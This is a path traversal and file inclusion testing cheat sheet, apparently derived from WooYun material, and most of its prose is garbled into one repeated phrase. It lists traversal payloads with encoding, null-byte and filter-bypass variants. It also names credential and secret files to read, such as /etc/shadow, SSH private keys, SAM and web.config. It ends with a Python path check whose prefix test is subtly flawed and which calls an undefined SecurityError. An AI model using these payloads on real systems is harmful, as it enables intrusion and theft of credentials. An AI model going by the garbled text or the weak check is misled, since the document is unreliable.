# Web file inclusion and traversal testing guidance - file inclusion and traversal testing guidance

> file inclusion and traversal testing guidance: WooYun file inclusion and traversal testing guidance | file inclusion and traversal testing guidance web-file-infra.md

## file inclusion and traversal testing guidance、file inclusion and traversal testing guidance

### 2.1 file inclusion and traversal testing guidance

```
file inclusion and traversal testing guidance -> [file inclusion and traversal testing guidance] -> file inclusion and traversal testing guidance
file inclusion and traversal testing guidance: file inclusion and traversal testing guidance"file inclusion and traversal testing guidance=file inclusion and traversal testing guidance"，file inclusion and traversal testing guidance"file inclusion and traversal testing guidance=file inclusion and traversal testing guidance"
```

### 2.2 file inclusion and traversal testing guidance

file inclusion and traversal testing guidance(file inclusion and traversal testing guidance):

```
file inclusion and traversal testing guidance: filename, filepath, path, file, filePath, hdfile, inputFile
file inclusion and traversal testing guidance: download, down, attachment, attach, doc
file inclusion and traversal testing guidance: read, load, get, fetch, open, input
file inclusion and traversal testing guidance: template, tpl, page, include, temp
file inclusion and traversal testing guidance: url, src, dir, folder, resource, name
```

file inclusion and traversal testing guidance(TOP 5):
1. file inclusion and traversal testing guidance (27file inclusion and traversal testing guidance) - `down.php, download.jsp`
2. file inclusion and traversal testing guidance (17file inclusion and traversal testing guidance) - `view.php, preview.jsp`
3. file inclusion and traversal testing guidance (6file inclusion and traversal testing guidance) - `attachment.php`
4. file inclusion and traversal testing guidance (5file inclusion and traversal testing guidance) - `pic.php, image.jsp`
5. file inclusion and traversal testing guidance (4file inclusion and traversal testing guidance) - `log.php, viewlog.jsp`

### 2.3 file inclusion and traversal testing guidancePayload

file inclusion and traversal testing guidance:

```bash
../                          # Linuxfile inclusion and traversal testing guidance
..\..\                       # Windowsfile inclusion and traversal testing guidance
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

file inclusion and traversal testing guidance:

```bash
# URLfile inclusion and traversal testing guidance
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# URLfile inclusion and traversal testing guidance
%252e%252e%252f  |  ..%252f

# Unicode/UTF-8file inclusion and traversal testing guidance (GlassFishfile inclusion and traversal testing guidance)
%c0%ae%c0%ae/%c0%af

# file inclusion and traversal testing guidance
..%2f  |  %2e%2e/  |  ..%c0%af
```

file inclusion and traversal testing guidance:

```bash
# file inclusion and traversal testing guidance (PHP<5.3.4 / Javafile inclusion and traversal testing guidance)
../../../etc/passwd%00.jpg

# file inclusion and traversal testing guidance
../../../WEB-INF/web.xml%3f

# file inclusion and traversal testing guidance
....//  |  ....\/  |  ..\/  |  ./../../

# file inclusion and traversal testing guidance/file inclusion and traversal testing guidance
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 file inclusion and traversal testing guidance

Linuxfile inclusion and traversal testing guidance:

```bash
/etc/passwd                    # file inclusion and traversal testing guidance(file inclusion and traversal testing guidance)
/etc/shadow                    # file inclusion and traversal testing guidance
/etc/hosts                     # file inclusion and traversal testing guidance
/root/.ssh/id_rsa              # SSHfile inclusion and traversal testing guidance
/root/.bash_history            # file inclusion and traversal testing guidance
/proc/self/environ             # file inclusion and traversal testing guidance
/etc/nginx/nginx.conf          # Nginxfile inclusion and traversal testing guidance
/etc/my.cnf                    # MySQLfile inclusion and traversal testing guidance
```

Windowsfile inclusion and traversal testing guidance:

```bash
C:\windows\win.ini             # file inclusion and traversal testing guidance(file inclusion and traversal testing guidance)
C:\boot.ini                    # file inclusion and traversal testing guidance(XP/2003)
C:\inetpub\wwwroot\web.config  # IISfile inclusion and traversal testing guidance
C:\windows\system32\config\sam # SAMfile inclusion and traversal testing guidance
```

Java Web:

```bash
WEB-INF/web.xml                         # file inclusion and traversal testing guidance(file inclusion and traversal testing guidance)
WEB-INF/classes/jdbc.properties          # file inclusion and traversal testing guidance
WEB-INF/classes/applicationContext.xml   # Springfile inclusion and traversal testing guidance
WEB-INF/classes/hibernate.cfg.xml        # Hibernatefile inclusion and traversal testing guidance
```

PHPfile inclusion and traversal testing guidance:

```bash
config.php | config.inc.php | db.php | conn.php    # file inclusion and traversal testing guidance
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # file inclusion and traversal testing guidance(file inclusion and traversal testing guidance)
../web.config              # file inclusion and traversal testing guidance
```

### 2.5 file inclusion and traversal testing guidance

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. file inclusion and traversal testing guidance
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. file inclusion and traversal testing guidance
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. file inclusion and traversal testing guidance
    # 4. file inclusion and traversal testing guidance
    return full_path
```

file inclusion and traversal testing guidance: file inclusion and traversal testing guidance(realpath/normpath) -> file inclusion and traversal testing guidance -> file inclusion and traversal testing guidance -> file inclusion and traversal testing guidance

---

